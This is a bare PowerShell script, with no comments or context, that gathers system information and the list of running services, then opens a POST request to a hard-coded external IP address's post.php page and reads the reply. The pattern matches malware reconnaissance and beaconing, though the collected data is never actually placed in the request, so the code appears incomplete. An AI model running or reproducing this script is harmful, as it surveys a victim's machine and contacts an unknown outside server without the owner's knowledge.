$infos = systeminfo;$task = Get-Service;$infos = $infos | Out-String;$task = $task | Out-String;



$WebRequest = [System.Net.WebRequest]::Create("http://178.170.58.9/post.php")
$WebRequest.Method = "POST"
$WebRequest.ContentType = "application/json"
$Response = $WebRequest.GetResponse()
$ResponseStream = $Response.GetResponseStream()
$ReadStream = New-Object System.IO.StreamReader $ResponseStream
$Data=$ReadStream.ReadToEnd()

